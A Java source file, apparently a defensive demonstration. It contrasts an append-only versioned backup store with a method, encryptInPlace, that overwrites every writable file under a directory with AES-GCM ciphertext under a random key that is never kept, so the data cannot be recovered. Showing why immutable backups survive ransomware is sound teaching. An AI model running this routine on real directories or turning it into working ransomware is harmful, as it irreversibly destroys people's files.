package com.jk.explore.security.backups;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.GeneralSecurityException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.TreeMap;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/** What ransomware does to files it can write to, and the copy it cannot: a store that only ever adds new versions. */
final class Ransomware {

    /** How many files were encrypted and how many could not be written. */
    record Attack(int encrypted, int blocked) {
    }

    /** A store with no way to change or delete: it can only add a new version of a name at a time. */
    static final class VersionedStore {
        private final Map<String, TreeMap<Long, byte[]>> versions = new TreeMap<>();

        void append(String name, byte[] data, long time) {
            versions.computeIfAbsent(name, key -> new TreeMap<>()).put(time, data.clone());
        }

        Optional<byte[]> latestBefore(String name, long time) {
            TreeMap<Long, byte[]> history = versions.get(name);
            if (history == null || history.floorEntry(time) == null) {
                return Optional.empty();
            }
            return Optional.of(history.floorEntry(time).getValue().clone());
        }

        int versionCount(String name) {
            return versions.containsKey(name) ? versions.get(name).size() : 0;
        }
    }

    private Ransomware() {
    }

    /** Encrypts every file it is allowed to write, in place, with a key it keeps. */
    static Attack encryptInPlace(Path dir) throws IOException, GeneralSecurityException {
        byte[] key = new byte[32];
        new SecureRandom().nextBytes(key);
        int encrypted = 0;
        int blocked = 0;
        List<Path> files;
        try (Stream<Path> walk = Files.walk(dir)) {
            files = new ArrayList<>(walk.filter(Files::isRegularFile).toList());
        }
        for (Path file : files) {
            byte[] nonce = new byte[12];
            new SecureRandom().nextBytes(nonce);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, nonce));
            byte[] locked = cipher.doFinal(Files.readAllBytes(file));
            try {
                Files.write(file, locked);
                encrypted++;
            } catch (IOException e) {
                blocked++;
            }
        }
        return new Attack(encrypted, blocked);
    }
}
